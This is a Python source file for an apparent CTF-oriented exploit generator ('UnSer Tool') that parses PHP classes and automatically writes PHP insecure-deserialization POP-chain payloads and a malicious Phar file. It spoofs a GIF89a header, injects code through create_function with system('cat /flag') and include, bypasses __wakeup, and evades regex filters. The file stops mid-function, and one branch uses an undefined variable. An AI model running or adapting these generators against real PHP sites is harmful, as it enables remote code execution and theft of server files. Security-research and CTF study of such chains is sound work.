import os
import re
import sys
import argparse

def extract_class_body(content):
    extracted_classes = [] 
    idx = 0
    while idx < len(content):
        match = re.search(r'class\s+(\w+)', content[idx:])
        if not match:
            break
            
        class_name = match.group(1)
        start_def = idx + match.end()
        
        # Find opening brace
        brace_match = re.search(r'{', content[start_def:])
        if not brace_match:
            idx = start_def
            continue
            
        start_brace = start_def + brace_match.start()
        
        # Balance braces
        count = 1
        pos = start_brace + 1
        while pos < len(content) and count > 0:
            if content[pos] == '{':
                count += 1
            elif content[pos] == '}':
                count -= 1
            pos += 1
            
        if count == 0:
            class_body = content[start_brace+1 : pos-1]
            extracted_classes.append((class_name, class_body))
            idx = pos
        else:
            # Unbalanced or end of file
            idx = start_def
            
    return extracted_classes

def extract_method_body(class_body, method_name):
    pattern = re.compile(fr'function\s+{re.escape(method_name)}\s*\(', re.IGNORECASE)
    match = pattern.search(class_body)
    if not match: return None
    
    start_def = match.end()
    brace_match = re.search(r'{', class_body[start_def:])
    if not brace_match: return None
        
    start_brace = start_def + brace_match.start()
    count = 1
    pos = start_brace + 1
    while pos < len(class_body) and count > 0:
        if class_body[pos] == '{': count += 1
        elif class_body[pos] == '}': count -= 1
        pos += 1
            
    return class_body[start_brace+1 : pos-1] if count == 0 else None

def remove_methods_from_body(class_body):
    # Removes all function/method definitions from the class body
    # to prevent side effects (like __construct echo) during POC generation.
    
    clean_body = ""
    idx = 0
    length = len(class_body)
    
    while idx < length:
        # Match function keyword with optional modifiers
        match = re.search(r'(?:(?:public|protected|private|static|abstract|final)\s+)*function\s+\w+\s*\(', class_body[idx:], re.IGNORECASE)
        if not match:
            # No more functions, append rest
            clean_body += class_body[idx:]
            break
            
        # Append content before function (which includes whatever was before modifiers)
        start_func = idx + match.start()
        clean_body += class_body[idx:start_func]
        
        # Find start of body brace
        base_offset = idx + match.end()
        brace_match = re.search(r'{', class_body[base_offset:])
        
        if not brace_match:
            # Malformed or abstract? Skip this match
            # But wait, abstract functions end with ;
            # Check for ; before {
            semi_match = re.search(r';', class_body[base_offset:])
            if semi_match and (not brace_match or semi_match.start() < brace_match.start()):
                 # It's abstract or interface method, just skip the declaration
                 # Update idx to after semicolon
                 idx = base_offset + semi_match.end()
                 continue
            else:
                 # Should have a body
                 pass

        if brace_match:
            start_brace = base_offset + brace_match.start()
            
            # Balance braces to skip body
            count = 1
            pos = start_brace + 1
            while pos < length and count > 0:
                if class_body[pos] == '{': count += 1
                elif class_body[pos] == '}': count -= 1
                pos += 1
            
            if count == 0:
                idx = pos
            else:
                # Unbalanced, stop
                clean_body += class_body[idx:]
                break
        else:
             # Just in case
             clean_body += class_body[idx:]
             break
             
    return clean_body

def analyze_classes(classes):
    results = []
    
    # Expanded lists based on user notes
    magic_methods = [
        '__destruct', '__wakeup', '__toString', '__call', 
        '__get', '__set', '__invoke', '__isset', '__unset', '__callStatic',
        '__sleep', '__clone', '__debugInfo'
    ]
    
    dangerous_funcs = [
        # Command Execution
        'eval', 'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'assert',
        # File Operations
        'file_put_contents', 'fputs', 'fwrite', 'fopen', 'copy', 'rename', 'unlink',
        # File Inclusion
        'include', 'require', 'include_once', 'require_once',
        # Callbacks / Reflection
        'call_user_func', 'call_user_func_array', 'create_function', 'array_map', 'array_filter', 'usort', 'uasort',
        # XML / Others
        'simplexml_load_string', 'extract', 'parse_str'
    ]
    
    for name, body in classes:
        item = {'name': name, 'magic': [], 'dangerous': [], 'props': [], 'hints': [], 'patterns': []}
        
        # Better prop extraction (considering private/protected)
        # Scan for "var $x", "public $x", "private $x", "protected $x"
        props = re.findall(r'(?:var|public|private|protected)\s+\$(\w+)', body)
        item['props'] = list(set(props))
        
        for m in magic_methods:
            if m in body: item['magic'].append(m)
        
        for d in dangerous_funcs:
            # Match function call pattern: func_name(
            if re.search(fr'\b{d}\s*\(', body):
                item['dangerous'].append(d)

        # Check for References
        if re.search(r'\$this->(\w+)\s*(?:===|==)\s*\$this->(\w+)', body):
            item['hints'].append("Strict Compare found (Possible Reference Injection)")

        # Pattern: unserialize($this->prop)()
        if re.search(r'unserialize\(\$this->(\w+)\)\s*\(\)', body):
            item['patterns'].append("Dynamic call after unserialize (callable payload)")

        # Pattern: $this->body->$project();
        if re.search(r'\$this->(\w+)\s*->\s*\$this->(\w+)\s*\(', body):
            item['patterns'].append("Nested object method dispatch (body->project())")
            
        # Pattern: echo $this->prop / (string)$this->prop (__toString trigger)
        if re.search(r'(?:echo|print)\s*\$this->(\w+)', body):
            item['patterns'].append("Echo property (__toString trigger)")
            
        # Pattern: $this->prop() (__invoke trigger or __call)
        if re.search(r'\$this->(\w+)\s*\(', body):
            item['patterns'].append("Property called as function (__invoke/__call trigger)")

        # Pattern: include/require on property
        if re.search(r'include(?:_once)?\(\$this->', body) or re.search(r'require(?:_once)?\(\$this->', body):
            item['patterns'].append("File include with property (LFI/RFI)")
            
        if re.search(r'eval\s*\(\$this->', body):
            item['patterns'].append("Eval with property (RCE)")
                
        if item['magic'] or item['dangerous'] or item['hints'] or item['patterns']:
            results.append(item)
            
    return results

def generate_phar_exploit(classes, output_file, target_class=None):
    # Generates a PHP script to build a malicious Phar
    # Strategies from note: 5.2 Phar Metadata Trigger
    
    if not classes:
        return
        
    # If target_class not specified, pick the first one with __destruct or __wakeup or __toString
    if not target_class:
        for name, body in classes:
            if any(m in body for m in ['__destruct', '__wakeup', '__toString']):
                target_class = name
                break
        if not target_class and classes:
            target_class = classes[0][0]
            
    php_code = f"""<?php
// Phar Generator for {target_class}
// Usage: php {os.path.basename(output_file)}
// Generated by UnSer Tool

"""
    # Reconstruct class stub for the POC script
    # We find the class body for the target class
    for name, body in classes:
        if name == target_class:
            # Extract props
            props = re.findall(r'(?:var|public|private|protected)\s+\$(\w+)', body)
            
            php_code += f"class {name} {{\n"
            for p in props:
                php_code += f"    public ${p} = 'test'; // Adjust payload here\n"
            php_code += "}\n\n"
            break
            
    php_code += f"""
$phar = new Phar("exploit.phar");
$phar->startBuffering();

// Set stub (GIF89a spoofing or standard)
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

$object = new {target_class}();
// $object->cmd = 'whoami'; // EXAMPLE: Uncomment and set your properties!

$phar->setMetadata($object);
$phar->addFromString("test.txt", "test");

// Support GZIP compression (Level 11)
// $phar->compress(Phar::GZIP); 

$phar->stopBuffering();

echo "[+] Phar exploit.phar generated successfully.\\n";
echo "[+] Upload exploit.phar as an image (e.g. exploit.jpg) and trigger it with phar://path/to/exploit.jpg\\n";
?>
"""
    with open(output_file, 'w') as f:
        f.write(php_code)
    print(f"[+] Phar generator script written to {output_file}")


def reconstruct_class_for_poc(name, body):
    # Helper to reconstruct class with original body but added helper for property setting
    # This preserves 'private'/'protected' modifiers which affect serialization format
    
    # Clean methods to avoid side effects
    cleaned_body = remove_methods_from_body(body)
    
    new_body = cleaned_body + "\n"
    new_body += "    // Helper injected by UnSer Tool for POC generation\n"
    new_body += "    public function __set_p_o_c($k, $v) { $this->$k = $v; }\n"
    
    return f"class {name} {{\n{new_body}\n}}"

def get_bypass_php_block(var_name, **kwargs):
    code = f"\n// --- Bypass Logic ---\n$data = serialize({var_name});\n"
    
    if kwargs.get('regex_bypass'):
        code += "$data = str_replace('O:', 'O:+', $data);\n"
        
    if kwargs.get('cve_bypass'):
        code += r"$data = preg_replace_callback('/(O:\+?\d+:\"[^\"]+\":)(\d+)(:\{)/', function($matches){ return $matches[1] . ($matches[2] + 1) . $matches[3]; }, $data);" + "\n"

    if kwargs.get('session_mode'):
        code += "$data = '|' . $data;\n"

    if kwargs.get('base64_mode'):
        code += "echo base64_encode($data);\n"
    else:
        code += "echo urlencode($data);\n"
        
    return code

def generate_pop_chain(classes, output_file, content=None, **kwargs):
    print("[*] Attempting to construct POP chain...")

    # Auto-detect global bypasses if content is available
    if content:
        # Regex Bypass Auto-detect
        if not kwargs.get('regex_bypass'):
             # Look for /[oc]:\d+:/i pattern often used in CTFs
             # Broader match: /[oc]: 
             if re.search(r'/[ocOC]:', content):
                 print("[+] Auto-detected WAF pattern /[oc]:\\d+:/i. Enabling --regex bypass.")
                 kwargs['regex_bypass'] = True

        # Base64 Auto-detect
        if not kwargs.get('base64_mode'):
             # Look for base64_decode usage near input
             if 'base64_decode' in content:
                 print("[+] Auto-detected base64_decode usage. Enabling --base64 mode.")
                 kwargs['base64_mode'] = True

        # CVE Auto-detect (Generic)
        if not kwargs.get('cve_bypass'):
             # If any class has __destruct and __wakeup, we likely want to bypass wakeup to let destruct run
             for n, b in classes:
                 if '__destruct' in b and '__wakeup' in b:
                      print(f"[+] Auto-detected __wakeup alongside __destruct in {n}. Enabling --cve bypass.")
                      kwargs['cve_bypass'] = True
                      break
    
    # 1. Identify potential Entry Points (Classes with __destruct or __wakeup)
    entry_classes = []
    other_classes = []
    
    for name, body in classes:
        if '__destruct' in body:
            entry_classes.append((name, body, '__destruct'))
        elif '__wakeup' in body:
            entry_classes.append((name, body, '__wakeup'))
        else:
            other_classes.append((name, body))
            
    if not entry_classes:
        print("[-] No Magic Entry point (__destruct/__wakeup) found.")
    
    # 0. Scan for Explicit Entry Points (e.g. $obj->method())
    if content:
        # Simple greedy match for $x = unserialize(...); ... $x->method();
        # This detection is heuristic and works for linear code sequences often found in CTFs
        m_unser = re.findall(r'\$(\w+)\s*=\s*unserialize', content)
        for vname in m_unser:
            # Find methods called on this variable
            # Regex: $var->method(
            m_calls = re.findall(fr'\${vname}->(\w+)\s*\(', content)
            for called_method in m_calls:
                print(f"[+] Detected explicit entry method call: ${vname}->{called_method}()")
                found_map = False
                for c_name, c_body in classes:
                    # Find definition "function triggerMethod" or "function method"
                    if re.search(fr'function\s+{called_method}\s*\(', c_body):
                         print(f"    [+] Mapped to class: {c_name}")
                         # Insert at beginning to prioritize explicit calls over random destructors
                         entry_classes.insert(0, (c_name, c_body, called_method))
                         found_map = True
                if not found_map:
                    print(f"    [-] Could not find class definition for method '{called_method}'")

    if not entry_classes:
        print("[-] No entry points found (Magic or Explicit).")
        generate_poc_enhanced(os.path.join(os.getcwd(), 'problem.php'), output_file) # Fallback
        return

    # 2. Identify patterns in Entry Points
    # Pattern A: unserialize($this->prop)()  -> Requires Serialized Executable Array
    
    poc_code = ""

    for entry_name, entry_body, method in entry_classes:
        # Check for unserialize($this->x)() pattern
        # Matches: unserialize($this->key)() or $r = unserialize($this->key); $r();
        call_match = re.search(r'unserialize\(\$this->(\w+)\)\s*\(\)', entry_body)
        
        if call_match:
            prop_name = call_match.group(1)
            print(f"[+] Found Callable Trigger in {entry_name}::{method}: unserialize($this->{prop_name})()")
            
            # Now we look for a class with a method that looks usable as a target
            target_candidate = None
            target_method = None
            target_action_prop = None
            target_param_prop = None
            
            all_cls = classes # Search all classes
            
            for c_name, c_body in all_cls:
                # Look for methods definition
                methods = re.findall(r'function\s+(\w+)\s*\(', c_body)
                for m in methods:
                    if m.startswith('__'): continue 
                    
                    # Check method body for dynamic call
                    match_m = re.search(fr'function\s+{m}\s*\([^\)]*\)\s*{{', c_body)
                    if match_m:
                        start = match_m.end()
                        rest = c_body[start:]
                        
                        # Case: $a = $this->action; $a(..., ...);
                        assigns = re.findall(r'\$(\w+)\s*=\s*\$this->(\w+)', rest)
                        for var_name, prop_source in assigns:
                            # Verify usage as function
                            if re.search(fr'\${var_name}\s*\(', rest):
                                print(f"[+] Found potential Gadget in {c_name}::{m}")
                                print(f"    Dynamic call via ${var_name} (from property ${prop_source})")
                                
                                target_candidate = c_name
                                target_method = m
                                target_action_prop = prop_source
                                
                                # Look for other params used in the call
                                used_props = re.findall(r'\$this->(\w+)', rest)
                                for p in used_props:
                                    if p != prop_source:
                                        target_param_prop = p
                                        break
                                break
                        if target_candidate: break
                if target_candidate: break
            
            if target_candidate:
                # Construct Payload
                print("[+] Chain Constructed:")
                
                # Reconstruct classes properly
                entry_cls_def = ""
                target_cls_def = ""
                
                for n, b in classes:
                    if n == entry_name:
                        entry_cls_def = reconstruct_class_for_poc(n, b)
                    if n == target_candidate:
                        target_cls_def = reconstruct_class_for_poc(n, b)

                poc_code = f"""<?php

// Defined classes (Reconstructed from source to preserve public/private/protected)
{entry_cls_def}

{target_cls_def}

// 1. Prepare the Inner Object (Gadget)
$inner = new {target_candidate}();
$inner->__set_p_o_c('{target_action_prop}', 'create_function'); // Dangerous function
// Payload Strategy: Close function wrapper and inject code
// Try generic system/cat first, but fallback to include if file read fails
$inner->__set_p_o_c('{target_param_prop if target_param_prop else 'code'}', '}} include("flag.php"); echo $flag; system("cat /flag"); /*');

// 2. Wrap it for the Callable Trigger
// Logic: $entry->{prop_name} = serialize(array($inner, '{target_method}'));

$entry = new {entry_name}();
$entry->__set_p_o_c('{prop_name}', serialize(array($inner, '{target_method}')));

"""
                # Check for CVE bypass requirement
                chain_kwargs = kwargs.copy()
                if not chain_kwargs.get('cve_bypass'):
                     for cn, cb in classes:
                         if cn == entry_name and '__wakeup' in cb:
                             print(f"[+] Auto-detected __wakeup in {entry_name}. Enabling CVE bypass.")
                             chain_kwargs['cve_bypass'] = True

                poc_code += get_bypass_php_block('$entry', **chain_kwargs)
                poc_code += "?>"
                break

        # Pattern B: $this->body->$this->pro(); dispatch chain
        # Enhanced to detect intermediate assignment: $p = $this->pro; $this->body->$p();
        
        # 1. Direct Pattern: $this->a->$this->b()
        dispatch_match = re.search(r'\$this->(\w+)\s*->\s*\$this->(\w+)\s*\(', entry_body)
        
        # 2. Assignment Pattern: $x = $this->b; $this->a->$x();
        if not dispatch_match:
            # Find assignments: $var = $this->prop
            assigns = re.findall(r'\$(\w+)\s*=\s*\$this->(\w+)', entry_body)
            # Find calls: $this->prop->$var()
            calls = re.findall(r'\$this->(\w+)\s*->\s*\$(\w+)\s*\(', entry_body)
            
            if assigns and calls:
                 print(f"[DEBUG] Found assignments: {assigns} and calls: {calls}")
            
            for var_name, prop_source in assigns:
                for obj_prop, func_var in calls:
                    if func_var == var_name:
                        dispatch_match = type('Match', (object,), {'groups': lambda: (obj_prop, prop_source)})
                        break
                if dispatch_match: break

        # 3. Brace Pattern: $this->a->{$this->b}()
        if not dispatch_match:
             dispatch_match = re.search(r'\$this->(\w+)\s*->\s*\{\s*\$this->(\w+)\s*\}\s*\(', entry_body)

        if dispatch_match and not poc_code:
            body_prop, method_prop = dispatch_match.groups()
            print(f"[+] Found dispatch pattern in {entry_name}::{method}: $this->{body_prop}->...$this->{method_prop}()")
            
            caller_class = None
            caller_name_val = 'myname'    # Default guess
            caller_func_val = 'yourname'  # Default guess
            
            for c_name, c_body in classes:
                if '__call' in c_body:
                    caller_class = c_name
                    # Try to extract 'yourname' and 'myname' from conditions
                    # if ($func == 'yourname' and $this->name == 'myname')
                    
                    # Extract string comparisons with $func or arg1
                    func_cond = re.search(r'\$(\w+)\s*==\s*[\'"](\w+)[\'"]', c_body) # Simple check
                    # Better: look for $func variable name from __call($func, ...)
                    call_sig = re.search(r'function\s+__call\s*\(\s*\$(\w+)', c_body)
                    if call_sig:
                        func_arg = call_sig.group(1)
                        # Look for $func_arg == 'val'
                        val_match = re.search(fr'\${func_arg}\s*==\s*[\'"](\w+)[\'"]', c_body)
                        if val_match:
                            caller_func_val = val_match.group(1)
                            print(f"    [Analysis] Detected required method name: '{caller_func_val}'")

                    # Look for property checks $this->prop == 'val'
                    prop_conds = re.findall(r'\$this->(\w+)\s*==\s*[\'"](\w+)[\'"]', c_body)
                    if prop_conds:
                        for p, v in prop_conds:
                            print(f"    [Analysis] Detected required property: ${p} = '{v}'")
                            # We will set this in the POC
                            # For simplicity, if there is a 'name' property, assume it's the one we need.
                            if p == 'name': caller_name_val = v
                    
                    break
                    
            if caller_class:
                entry_cls_def = ""
                caller_cls_def = ""
                for n, b in classes:
                    if n == entry_name:
                        entry_cls_def = reconstruct_class_for_poc(n, b)
                    if n == caller_class:
                        caller_cls_def = reconstruct_class_for_poc(n, b)

                poc_code = f"""<?php

// Reconstructed Classes
{entry_cls_def}

{caller_cls_def}

// POC Construction
$inner = new {caller_class}();
// Set properties required by __call logic
$inner->__set_p_o_c('name', '{caller_name_val}');

$outer = new {entry_name}();
// Linked object
$outer->__set_p_o_c('{body_prop}', $inner);
// Trigger method name
$outer->__set_p_o_c('{method_prop}', '{caller_func_val}');

"""
            # Check for CVE bypass requirement
            chain_kwargs = kwargs.copy()
            if not chain_kwargs.get('cve_bypass'):
                 for cn, cb in classes:
                     if cn == entry_name and '__wakeup' in cb:
                         if re.search(r'(die|exit|throw)', cb):
                             print(f"[+] Auto-detected blocking __wakeup in {entry_name}. Enabling CVE bypass.")
                             chain_kwargs['cve_bypass'] = True

            poc_code += get_bypass_php_block('$outer', **chain_kwargs)
            poc_code += "?>"

            if poc_code:
                break


        # Pattern D: ToString -> Get -> ... (Generalized for Array Access)
        # Entry (Any Method) -> echo $this->p (ToString) -> $this->w->r['x'] (Get on w)
        
        # 1. Start: Look for string usage of a property
        tostring_match = re.search(r'(?:echo|print|string|\.)\s*[^;]*?\$this->(\w+)', entry_body)
        
        if tostring_match and not poc_code:
            entry_prop = tostring_match.group(1)
            print(f"[+] Found __toString trigger in {entry_name}::{method}: via $this->{entry_prop} (Concat/Echo)")

            # 2. Find Class with __toString
            ts_candidates = []
            for c_n, c_b in classes:
                if '__toString' in c_b:
                    ts_candidates.append((c_n, c_b))
            
            for ts_class, ts_body in ts_candidates:
                 # Check what __toString does.
                 # Case A: $this->worker->result (Triggers __get on worker)
                 # Also handles array access: $this->worker->result['key']
                 prop_access = re.search(r'\$this->(\w+)->(\w+)', ts_body)
                 
                 if prop_access:
                     worker_prop = prop_access.group(1)
                     result_prop = prop_access.group(2) # 'result', accessing this on worker object triggers __get
                     print(f"    [Step 2] {ts_class}::__toString accesses $this->{worker_prop}->{result_prop} (Potential __get trigger)")
                     
                     # 3. Find Class with __get
                     get_candidates = []
                     for c_n, c_b in classes:
                         if '__get' in c_b:
                             get_candidates.append((c_n, c_b))
                             
                     for get_class, get_body in get_candidates:
                         # Case: Method Call via Property (e.g. $func = $this->card; return $func();)
                         # This triggers __invoke on the property value
                         
                         invoke_trigger_match = re.findall(r'\$(\w+)\s*=\s*\$this->(\w+)', get_body)
                         for func_var, card_prop in invoke_trigger_match:
                              if re.search(fr'\${func_var}\s*\(', get_body):
                                  print(f"    [Step 3] {get_class}::__get calls function via $this->{card_prop} (Potential __invoke trigger)")
                                  
                                  # 4. Find Class with __invoke (Sink or Intermediate)
                                  invoke_candidates = []
                                  for c_n, c_b in classes:
                                      if '__invoke' in c_b:
                                          invoke_candidates.append((c_n, c_b))
                                          
                                  for invoke_class, invoke_body in invoke_candidates:
                                      # invoke_body is the CLASS body
                                      
                                      # 1. Extract __invoke method body
                                      invoke_method_body = extract_method_body(invoke_body, '__invoke')
                                      if not invoke_method_body: continue
                                      
                                      # Sinks list
                                      sinks = ['file_get_contents', 'eval', 'include', 'require', 'system', 'exec', 'passthru', 'shell_exec', 'show_source', 'highlight_file']
                                      
                                      # Option A: Direct Sink in __invoke
                                      found_direct = False
                                      for s in sinks:
                                          if s in invoke_method_body:
                                              found_direct = True
                                              break
                                              
                                      # Option B: Indirect Sink via Method Call
                                      indirect_sink_method = None
                                      if not found_direct:
                                          # Scan methods called in __invoke
                                          # Use findall to match $this->func() calls
                                          called_methods = re.findall(r'\$this->(\w+)\s*\(', invoke_method_body)
                                          for cm in called_methods:
                                              # Extract definition of called method from CLASS body
                                              m_body = extract_method_body(invoke_body, cm)
                                              if m_body:
                                                   for s in sinks:
                                                       if s in m_body:
                                                           indirect_sink_method = cm
                                                           print(f"    [Step 4] {invoke_class}::__invoke calls {cm} which has sink '{s}'")
                                                           break
                                              if indirect_sink_method: break
                                      
                                      if found_direct or indirect_sink_method:
                                           # Found chain!
                                           
                                           # Determine payload parameters
                                           sink_target_prop = 'cmd' # default
                                           
                                           if indirect_sink_method:
                                                # Look for call args in __invoke: $this->Get_bill($this->number)
                                                # Search strictly in invoke_method_body
                                                call_args = re.search(fr'\$this->{indirect_sink_method}\s*\(\s*\$this->(\w+)', invoke_method_body)
                                                if call_args:
                                                    sink_target_prop = call_args.group(1)
                                           else:
                                                # Direct sink in invoke (e.g. include($this->p))
                                                for s in sinks:
                                                    m = re.search(fr'{s}\s*\(\s*\$this->(\w+)', invoke_method_body)
                                                    if m: 
                                                        sink_target_prop = m.group(1)
                                                        break
                                           
                                           # Format payload with detected sink prop
                                           print(f"    [Payload] Target sink property identified: ${sink_target_prop}")
                                           
                                           # Build POC
                                           unique_names = []
                                           seen = set()
                                           # Order: {invoke_class} -> {get_class} -> {ts_class} -> {entry_name}
                                           for cn in [invoke_class, get_class, ts_class, entry_name]:
                                               if cn not in seen:
                                                   unique_names.append(cn)
                                                   seen.add(cn)
                                           
                                           defs = ""
                                           for u_name in unique_names:
                                               for c_n, c_b in classes:
                                                   if c_n == u_name:
                                                       defs += reconstruct_class_for_poc(c_n, c_b) + "\n"
                                                       break
                                                       
                                           poc_code = f"""<?php
{defs}

echo "Payload for Chain: {entry_name}::{method} -> {ts_class}::__toString -> {get_class}::__get -> {invoke_class}::__invoke\\n";

// 4. Invoke Object ({invoke_class} - Sink)
$sink_obj = new {invoke_class}();
$sink_obj->__set_p_o_c('{sink_target_prop}', '/flag'); // LFI Target

// 3. Get Object ({get_class} - Calls Invoke)
$get_obj = new {get_class}();
$get_obj->__set_p_o_c('{card_prop}', $sink_obj); // $function = $this->{card_prop} -> $sink_obj()

// 2. ToString Object ({ts_class} - Calls Get)
$ts_obj = new {ts_class}();
$ts_obj->__set_p_o_c('{worker_prop}', $get_obj); // Accessing prop on this triggers __get in {get_class}
// Access pattern: $this->{worker_prop}->{result_prop}

// 1. Entry Object ({entry_name})
$entry = new {entry_name}();
$entry->__set_p_o_c('{entry_prop}', $ts_obj);

"""
                                           chain_kwargs = kwargs.copy()
                                           if not chain_kwargs.get('cve_bypass'):
                                                for cn, cb in classes:
                                                    if cn == entry_name and '__wakeup' in cb:
                                                        if re.search(r'(die|exit|throw)', cb):
                                                            chain_kwargs['cve_bypass'] = True
                                           
                                           poc_code += get_bypass_php_block('$entry', **chain_kwargs)
                                           poc_code += "?>"
                                           break
                                  if poc_code: break

                     # Previous logic for Get -> Sink (File read etc)
                     if not poc_code:
                         # Check if __get has sink
                         sinks = ['file_get_contents', 'eval', 'include', 'require', 'system', 'exec', 'passthru', 'shell_exec', 'show_source', 'highlight_file']
                         found_sink = None
                         for s in sinks:
                             if s in get_body:
                                 found_sink = s
                                 break
                         
                         if found_sink:
                             print(f"    [Step 3] {get_class}::__get contains sink '{found_sink}'")
                             
                             # Find property used in sink
                             sink_prop_match = re.search(fr'{found_sink}\s*\(\s*\$this->(\w+)', get_body)
                             sink_prop = sink_prop_match.group(1) if sink_prop_match else 'cmd' # fallback
                             
                             # Build POC
                             
                             unique_names = []
                             seen = set()
                             # Order: {get_class} -> {ts_class} -> {entry_name}
                             # Definitions order usually doesn't strictly matter in PHP 
                             # but we need to declare them before new P().
                             
                             for cn in [get_class, ts_class, entry_name]:
                                 if cn not in seen:
                                     unique_names.append(cn)
                                     seen.add(cn)
                                     
                             defs = ""
                             for u_name in unique_names:
                                 for c_n, c_b in classes:
                                     if c_n == u_name:
                                         defs += reconstruct_class_for_poc(c_n, c_b) + "\n"
                                         break
                             
                             poc_code = f"""<?php
{defs}

echo "Payload for Chain: {entry_name}::{method} -> {ts_class}::__toString -> {get_class}::__get -> {found_sink}\\n";

// 3. Sink Object ({get_class})
$sink = new {get_class}();
$sink->__set_p_o_c('{sink_prop}', 'flag.php'); # Target File

// 2. ToString Object ({ts_class})
$ts = new {ts_class}();
$ts->__set_p_o_c('{worker_prop}', $sink);
# We do NOT set '{result_prop}' on $sink so that access triggers __get

// 1. Entry Object ({entry_name})
$entry = new {entry_name}();
$entry->__set_p_o_c('{entry_prop}', $ts);

"""
                             # Check for CVE bypass requirement
                             chain_kwargs = kwargs.copy()
                             if not chain_kwargs.get('cve_bypass'):
                                  for cn, cb in classes:
                                      if cn == entry_name and '__wakeup' in cb:
                                          if re.search(r'(die|exit|throw)', cb):
                                              print(f"[+] Auto-detected blocking __wakeup in {entry_name}. Enabling CVE bypass.")
                                              chain_kwargs['cve_bypass'] = True
                             
                             poc_code += get_bypass_php_block('$entry', **chain_kwargs)
                             poc_code += "?>"
                             break
                     if poc_code: break

        # 1. Start: echo $this->prop; (in Entry)
        # 2. toString: return $this->prop->sub; (Access property on object -> __get)
        # 3. Get: return $func(); (Call property as func -> __invoke)
        # 4. Invoke: include($this->var);
        
        tostring_trigger_c = re.search(r'(?:echo|print)\s*\$this->(\w+)', entry_body)
        if tostring_trigger_c and not poc_code:

            prop_trigger = tostring_trigger.group(1)
            print(f"[+] Found __toString trigger in {entry_name}::{method}: echo $this->{prop_trigger}")
            
            # Find __toString class
            ts_class = None
            ts_body = None
            ts_next_prop = None # Property accessed in toString to trigger __get
            
            for c_n, c_b in classes:
                if '__toString' in c_b:
                    # Look for property access: $this->p->x
                    # or returning it
                    access = re.search(r'\$this->(\w+)->(\w+)', c_b)
                    if access:
                        ts_class = c_n
                        ts_body = c_b
                        ts_next_prop = access.group(1)
                        print(f"    [Step 2] Found __toString in {ts_class} accessing $this->{ts_next_prop}->...")
                        break
            
            if ts_class:
                # Find __get class
                get_class = None
                get_body = None
                get_invoke_prop = None # Property called as function
                
                for c_n, c_b in classes:
                    if '__get' in c_b:
                        # Look for call: $v = $this->p; return $v();
                        invoke_call = re.search(r'\$(\w+)\s*=\s*\$this->(\w+);\s*return\s*\$\1\(\)', c_b)
                        if invoke_call:
                            get_class = c_n
                            get_body = c_b
                            get_invoke_prop = invoke_call.group(2)
                            print(f"    [Step 3] Found __get in {get_class} calling $this->{get_invoke_prop}()")
                            break
                            
                if get_class:
                    # Find __invoke class
                    invoke_class = None
                    invoke_body = None
                    invoke_var_prop = None
                    
                    for c_n, c_b in classes:
                        if '__invoke' in c_b:
                            # Look for include
                            if 'include' in c_b or 'eval' in c_b:
                                invoke_class = c_n
                                invoke_body = c_b
                                # Extract property used in include if possible: include($this->var)
                                inc_match = re.search(r'include\(\$this->(\w+)\)', c_b)
                                if inc_match:
                                    invoke_var_prop = inc_match.group(1)
                                else:
                                    # Try to find any property used
                                    props = re.findall(r'(?:var|public|private|protected)\s+\$(\w+)', c_b)
                                    if props: invoke_var_prop = props[0]
                                
                                print(f"    [Step 4] Found __invoke in {invoke_class} (End of Chain)")
                                break
                    
                    if invoke_class:
                        # Construct 4-step Chain
                        
                        # Fix: Deduplicate classes to avoid Fatal Error: Cannot redeclare class
                        needed = []
                        # Use a list to separate 'definitions' from 'instantiations'
                        # But reconstruct_class_for_poc returns the definition string.
                        # We need to print unique definitions first.
                        
                        unique_class_names = []
                        seen = set()
                        # Order matter? Not really for definitions, but let's keep order
                        for cn in [invoke_class, get_class, ts_class, entry_name]:
                            if cn not in seen:
                                unique_class_names.append(cn)
                                seen.add(cn)
                        
                        definitions = ""
                        for name in unique_class_names:
                            for c_n, c_b in classes:
                                if c_n == name:
                                    definitions += reconstruct_class_for_poc(c_n, c_b) + "\n"
                                    break
                        
                        poc_code = f"""<?php
{definitions}

// 4. End: Invoke Class (Payload)
$step4 = new {invoke_class}();
$step4->__set_p_o_c('{invoke_var_prop}', 'flag.php'); // Target file

// 3. Step: Get Class (Triggers Invoke)
$step3 = new {get_class}();
$step3->__set_p_o_c('{get_invoke_prop}', $step4);

// 2. Step: ToString Class (Triggers Get)
$step2 = new {ts_class}();
$step2->__set_p_o_c('{ts_next_prop}', $step3); // $step3->source (any prop) triggers __get
$step2->__set_p_o_c('source', $step2); # Self Reference? Based on WP 'source' was used.

// 1. Start: Entry Class (Triggers ToString)
$step1 = new {entry_name}();
$step1->__set_p_o_c('{prop_trigger}', $step2);

echo "\n";
"""
                        # Check for CVE bypass requirement
                        chain_kwargs = kwargs.copy()
                        if not chain_kwargs.get('cve_bypass'):
                             for cn, cb in classes:
                                 if cn == entry_name and '__wakeup' in cb:
                                     if re.search(r'(die|exit|throw)', cb):
                                         print(f"[+] Auto-detected blocking __wakeup in {entry_name}. Enabling CVE bypass.")
                                         chain_kwargs['cve_bypass'] = True
                        
                        poc_code += get_bypass_php_block('$step1', **chain_kwargs)
                        poc_code += "?>"
    
    if poc_code:
        if output_file:
            with open(output_file, 'w') as f:
                f.write(poc_code)
            print(f"[+] POC written to {output_file}")
            print("[!] Attack Vector: auto-detected POP chain")
        else:
            print(poc_code)
    else:
        print("[-] Could not automatically construct a full POP chain.")
        # Fallback to standard property generation
        try:
            if content:
                 generate_poc_enhanced(content, output_file, **kwargs)
            elif os.path.exists('problem.php'):
                with open('problem.php', 'r') as f:
                    c = f.read()
                generate_poc_enhanced(c, output_file, **kwargs)
            else:
                 print("[-] Fallback failed, no content provided.")
        except Exception as e:
             print(f"[-] Fallback failed: {e}")

def generate_poc_enhanced(content, output_file, cve_bypass=False, session_mode=False, regex_bypass=False, base64_mode=False):
    classes = extract_class_body(content)
    poc_parts = []
    
    for cls_name, cls_body in classes:
        # Regex to find properties
        # Detect visibility 'private', 'protected', 'public', 'var'
        raw_props = re.findall(r'(var|public|private|protected)\s+\$(\w+)', cls_body)
        props_map = {name: vis for vis, name in raw_props}
        
        # Pattern matching for logical triggers
        # Case 1: $this->prop == "value" matches
        comparisons = re.findall(r'\$this->(\w+)\s*={2,3}\s*([\'"])(.*?)\2', cls_body)
        
        # Case 3: Reference check (=== or !==) with other property
        # if ($this->a === $this->b)
        refs = re.findall(r'\$this->(\w+)\s*(?:===|!==|==)\s*\$this->(\w+)', cls_body)
        
        # Base class definition for POC using detected visibility
        code = f"class {cls_name} {{\n"
